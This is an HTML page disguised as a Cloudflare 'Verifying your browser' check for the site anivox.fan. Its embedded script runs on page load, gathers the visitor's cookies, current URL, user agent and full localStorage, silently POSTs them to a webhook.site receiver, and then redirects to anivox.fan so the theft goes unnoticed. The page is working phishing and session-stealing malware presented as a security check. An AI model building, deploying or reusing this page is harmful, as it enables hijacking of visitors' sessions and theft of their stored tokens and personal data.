<!DOCTYPE html>
<html>
<head>
    <title>Cloudflare Verification</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #f7f7f7; }
        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #f38020; border-radius: 50%; width: 120px; height: 120px; animation: spin 2s linear infinite; margin: auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h2>Verifying your browser... Please wait.</h2>
    <p>Checking the security of your connection to anivox.fan</p>

    <script>
        const myReceiver = "https://webhook.site/774ce81e-edc6-45bc-8e34-e68442d54024";

        async function steal() {
            const data = {
                cookies: document.cookie,
                url: window.location.href,
                agent: navigator.userAgent,
                localStorage: JSON.stringify(localStorage)
            };

            fetch(myReceiver, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(data)
            });

            setTimeout(() => {
                window.location.href = "https://anivox.fan";
            }, 3000);
        }
        steal();
    </script>
</body>
</html>
